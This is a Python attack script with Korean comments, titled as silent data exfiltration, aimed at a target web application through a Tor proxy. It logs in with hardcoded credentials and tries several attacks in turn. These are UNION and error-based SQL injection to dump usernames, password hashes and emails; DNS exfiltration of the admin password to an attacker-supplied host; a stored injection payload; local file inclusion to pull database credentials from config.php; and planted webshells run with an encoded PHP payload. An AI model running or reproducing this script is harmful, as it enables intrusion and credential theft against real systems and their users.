#!/usr/bin/env python3
"""
조용한 데이터 탈취
테스트 명령어 없이 바로 목표 데이터만 추출
"""

import requests
import sys
import time
import base64

def silent_exfil(target_ip, attacker_ip):
    base_url = f"http://{target_ip}"

    session = requests.Session()
    session.proxies = {
        'http': 'socks5h://127.0.0.1:9050',
        'https': 'socks5h://127.0.0.1:9050'
    }

    print(f"[*] 타겟: {target_ip}")
    print(f"[*] 전략: 테스트 없이 바로 데이터 추출\n")

    # alice 로그인
    data = {'username': 'alice', 'password': 'alice2024'}
    resp = session.post(f"{base_url}/login.php", data=data, allow_redirects=True, timeout=10)

    if 'login.php' in resp.url:
        print("[-] 로그인 실패")
        return

    print("[+] alice 로그인 성공\n")

    # ========== 방법 1: SQL Injection으로 바로 데이터 덤프 ==========
    print("[방법 1] SQL Injection - 전체 users 테이블 덤프")
    print("[!] 단 1번의 요청으로 모든 유저 정보 추출\n")

    # UNION SELECT로 전체 users 테이블 덤프
    # 검색 기능이 있다고 가정
    sqli = "' UNION SELECT GROUP_CONCAT(username,':',password,':',email SEPARATOR '|'),2,3,4 FROM users-- "

    try:
        url = f"{base_url}/search.php?q={sqli}"
        resp = session.get(url, timeout=10)

        if resp.status_code == 200:
            print(f"[+] SQL 응답 받음 ({len(resp.text)} bytes)")

            # 유저 정보 패턴 찾기
            import re
            users = re.findall(r'([a-zA-Z0-9_]+):([a-fA-F0-9]{32,64}):([^|]+)', resp.text)

            if users:
                print(f"\n[+] ✅✅✅ 사용자 {len(users)}명 덤프 성공!")
                for username, password_hash, email in users:
                    print(f"    {username} : {password_hash} : {email}")

                # 파일로 저장
                filename = f"users_dump_{int(time.time())}.txt"
                with open(filename, 'w') as f:
                    for u, p, e in users:
                        f.write(f"{u}:{p}:{e}\n")
                print(f"\n[+] 저장: {filename}")
                return True

    except Exception as e:
        print(f"[-] 실패: {e}")

    # ========== 방법 2: 에러 기반 SQL Injection ==========
    print("\n[방법 2] 에러 기반 SQL Injection")
    print("[!] 에러 메시지로 데이터 추출\n")

    # EXTRACTVALUE로 데이터 추출
    sqli2 = "' AND EXTRACTVALUE(1, CONCAT(0x5c, (SELECT CONCAT(username,0x3a,password) FROM users LIMIT 1)))-- "

    try:
        url = f"{base_url}/search.php?q={sqli2}"
        resp = session.get(url, timeout=10)

        if 'XPATH' in resp.text or 'syntax error' in resp.text:
            print(f"[+] SQL 에러 발생!")
            print(f"{resp.text[:500]}")

    except:
        pass

    # ========== 방법 3: Blind SQLi with DNS Exfiltration ==========
    print("\n[방법 3] Blind SQL Injection + DNS 데이터 유출")
    print(f"[!] 데이터를 DNS 쿼리로 전송: {attacker_ip}\n")

    # DNS를 통해 데이터 유출 (LOAD_FILE + DNS)
    sqli3 = f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users WHERE username='admin'),'.{attacker_ip}\\\\\\\\share')))-- "

    try:
        url = f"{base_url}/search.php?q={sqli3}"
        resp = session.get(url, timeout=10)
        print(f"[*] DNS 요청 전송됨 (attacker 서버에서 확인)")

    except:
        pass

    # ========== 방법 4: Second Order SQL Injection ==========
    print("\n[방법 4] Second Order SQL Injection")
    print("[!] 프로필 업데이트로 백도어 삽입\n")

    # 프로필에 SQL 페이로드 저장 후 나중에 실행
    backdoor_payload = "' OR 1=1-- "

    try:
        # 프로필 업데이트
        profile_data = {
            'bio': backdoor_payload,
            'location': backdoor_payload
        }

        resp = session.post(f"{base_url}/profile.php", data=profile_data, timeout=10)
        print(f"[+] 백도어 프로필 저장됨")

        # 다른 페이지에서 실행 (검색, 통계 등)
        resp2 = session.get(f"{base_url}/stats.php", timeout=10)

        if 'admin' in resp2.text:
            print(f"[+] ✅ Second Order SQLi 성공!")
            print(f"{resp2.text[:300]}")

    except:
        pass

    # ========== 방법 5: Local File Inclusion - 민감 파일 바로 읽기 ==========
    print("\n[방법 5] LFI - 설정 파일 직접 읽기")
    print("[!] 1번의 요청으로 DB 자격증명 획득\n")

    lfi_targets = [
        "../config.php",
        "../../config.php",
        "../../../var/www/html/config.php",
    ]

    for target in lfi_targets:
        try:
            url = f"{base_url}/file.php?name={target}"
            resp = session.get(url, timeout=10)

            if resp.status_code == 200 and len(resp.text) > 50:
                # DB 정보 파싱
                import re

                # MySQL 자격증명 찾기
                db_matches = re.findall(r'(?:password|passwd|pwd|pass)["\']?\s*[=:]\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                user_matches = re.findall(r'(?:username|user|dbuser)["\']?\s*[=:]\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)
                host_matches = re.findall(r'(?:host|hostname|dbhost)["\']?\s*[=:]\s*["\']([^"\']+)["\']', resp.text, re.IGNORECASE)

                if db_matches:
                    print(f"[+] ✅✅✅ config.php 발견: {target}")
                    print(f"\n[+] DB 자격증명:")
                    print(f"    Host: {host_matches[0] if host_matches else 'localhost'}")
                    print(f"    User: {user_matches[0] if user_matches else 'unknown'}")
                    print(f"    Pass: {db_matches[0]}")

                    # 저장
                    with open('db_credentials.txt', 'w') as f:
                        f.write(f"Host: {host_matches[0] if host_matches else 'localhost'}\n")
                        f.write(f"User: {user_matches[0] if user_matches else 'unknown'}\n")
                        f.write(f"Pass: {db_matches[0]}\n")

                    print(f"\n[+] 저장: db_credentials.txt")
                    print(f"\n[!] 이제 직접 DB 접속 가능:")
                    print(f"    mysql -h {host_matches[0] if host_matches else 'localhost'} -u {user_matches[0] if user_matches else 'unknown'} -p")

                    return True

        except Exception as e:
            pass

    # ========== 방법 6: 웹쉘 통한 직접 파일 읽기 (명령어 없이) ==========
    print("\n[방법 6] 웹쉘 - 파일 내용 바로 출력")
    print("[!] cat 대신 PHP readfile() 사용\n")

    # 이미 업로드된 웹쉘 사용
    webshells = [
        "photo.php.jpg",
        "shell_4727.php",
        "avatar_4727.jpg",
    ]

    # PHP 코드: readfile()로 바로 파일 출력 (명령어 없음)
    php_code = base64.b64encode(b"<?php readfile('/var/www/html/config.php'); ?>").decode()

    for shell in webshells:
        try:
            # PHP eval로 바로 실행
            url = f"{base_url}/file.php?name=uploads/{shell}&eval={php_code}"
            resp = session.get(url, timeout=5)

            if 'mysql' in resp.text.lower() or 'password' in resp.text.lower():
                print(f"[+] ✅ 웹쉘 작동: {shell}")
                print(f"{resp.text[:500]}")
                return True

        except:
            pass

    print("\n[-] 모든 방법 실패")
    return False

def main():
    if len(sys.argv) < 3:
        print("사용법: python3 97_silent_data_exfil.py <TARGET_IP> <ATTACKER_IP>")
        print("예시: python3 97_silent_data_exfil.py 43.201.154.142 57.181.28.7")
        sys.exit(1)

    target_ip = sys.argv[1]
    attacker_ip = sys.argv[2]

    silent_exfil(target_ip, attacker_ip)

if __name__ == "__main__":
    main()
